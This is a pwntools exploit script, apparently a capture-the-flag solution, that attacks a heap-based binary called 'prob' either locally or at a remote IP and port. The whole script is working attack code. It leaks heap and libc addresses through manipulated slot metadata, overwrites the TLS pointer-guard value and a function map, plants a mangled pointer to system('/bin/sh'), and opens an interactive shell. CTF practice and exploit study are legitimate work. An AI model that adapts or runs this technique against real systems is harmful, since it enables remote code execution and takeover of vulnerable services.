from pwn import *
from pwnlib.util.proc import wait_for_debugger
import argparse
binaryname = './prob'
parser = argparse.ArgumentParser(description='Select the mode of operation.')
parser.add_argument('-r', action='store_true', help='Remote mode')
parser.add_argument('-d', action='store_true', help='Debug mode')
parser.add_argument('-g', action='store_true', help='GDB mode')
args = parser.parse_args()

libc = ELF('./libc.so.6')

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
context(arch='amd64', os='linux')

if args.r:
    p = remote('16.184.29.60', 28326)
elif args.d:
    p = process(binaryname, stdin=PTY)
    wait_for_debugger(p.pid)
elif args.g:
    p = gdb.debug(binaryname, gdbscript='''source ~/.gef-5927df4fb307124c444453b1cb85fa0ce79883c9\n''')
else:
    p = process(binaryname, stdin=PTY)

sla = lambda x, y : p.sendlineafter(x, y)
sa = lambda x, y : p.sendafter(x, y)
sl = lambda x : p.sendline(x)
s = lambda x : p.send(x)
rvu = lambda x : p.recvuntil(x)
rv = lambda x : p.recv(x)
rvl = lambda : p.recvline()
li = lambda x: log.info(hex(x))


def send_header(slot, cmd):
    """Send the 4-byte header: slot (u16) + cmd (u16)."""
    p.send(p16(cmd) + p16(slot))

def send_seq_len(seq, length):
    """Send the 8-byte seq + length (both u32)."""
    p.send(p32(seq) + p32(length))

def get_info(slot, seq=0):
    """
    Retrieve the 0x30-byte info blob for the given slot.
    Cmd = 0x1000.
    """
    rvu('Enter data: ')
    send_header(slot, 0x1000)
    send_seq_len(seq, 0)
    return p.recv(0x30)

def set_info(slot, data, seq=0):
    """
    Write up to 0x2F bytes into info[slot].
    Cmd = 0x100.
    """
    if len(data) > 0x2F:
        raise ValueError('Data length exceeds 0x2F bytes')
    rvu('Enter data: ')
    send_header(slot, 0x100)
    send_seq_len(seq, len(data))
    p.send(data)

def write_data(slot, data, seq=0, length=0):
    """
    Write arbitrary data into recvbuf[slot] at offset `seq`.
    Cmd = 1.
    """
    rvu('Enter data: ')
    send_header(slot, 1)
    send_seq_len(seq, length)
    p.send(data)

def clear_data(slot, seq=0):
    """
    Clear recvbuf[slot] and free its associated info_slot.
    Cmd = 0x10.
    """
    rvu('Enter data: ')
    send_header(slot, 0x10)
    send_seq_len(seq, 0)

write_data(0, b'\x01' * 0x20,0, 0x20)  # Write 0x20 bytes of data to slot 0
set_info(0, b'\xAA' * 0x20)  # Initialize slot 0 with empty data

write_data(1, b'\x02' * 0x20,0, 0x20)  # Write 0x20 bytes of data to slot 0

set_info(1, b'\xBB' * 0x20)  # Initialize slot 0 with empty data
write_data(1, b'\x02' * 0x20,0x10010, 0x0)  # fuck u heap feng

write_data(2, b'\x02' * 0x20,0, 0x20)  # Write 0x20 bytes of data to slot 0

a = get_info(1)
heapleak = a[0x20:0x28]
heapleak = u64(heapleak)
li(heapleak)

largeheap = heapleak - 0xFFF0
a = bytearray(a)
a[0x20:0x28] = p64(largeheap)
set_info(1,a[:0x28])
clear_data(1)

# set_info(1, b'\x00' * 0x1)  # Initialize slot 0 with empty data
# write_data(1, b'\x02' * 0x20,0x10010, 0x0)  # fuck u heap feng
# a = get_info(1)

# libcleak = a[0x10:0x18]
# libcleak = u64(libcleak)
# li(libcleak)

set_info(2, b'\x00' * 0x1)  # Initialize slot 0 with empty data
backupHD = get_info(2)


leaklibcheap = heapleak - 0xFFF0
li(leaklibcheap)
write_data(1, p64(leaklibcheap), 0, 8)
leaker = get_info(2)
leaker = leaker[0x20:0x28]
libc.address= u64(leaker) - 0x203B20
li(libc.address)


modify = bytearray(backupHD)
tls = libc.address - 0x2940
li(tls)
mangling = tls + 0xB0
modify[:0x8] = p64(mangling)
write_data(1, modify, 0, len(backupHD))
set_info(2,p64(0))

li(libc.symbols['system'])
li(next(libc.search(b'/bin/sh')))
modify = bytearray(backupHD)
tls = libc.address - 0x2940
funcmap = tls + 0x30

payload = p64(funcmap+8)
payload += p64(libc.symbols['system'] <<17)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(0)

modify[:0x8] = p64(funcmap)
write_data(1, modify, 0, len(backupHD))
set_info(2,payload)


p.interactive()

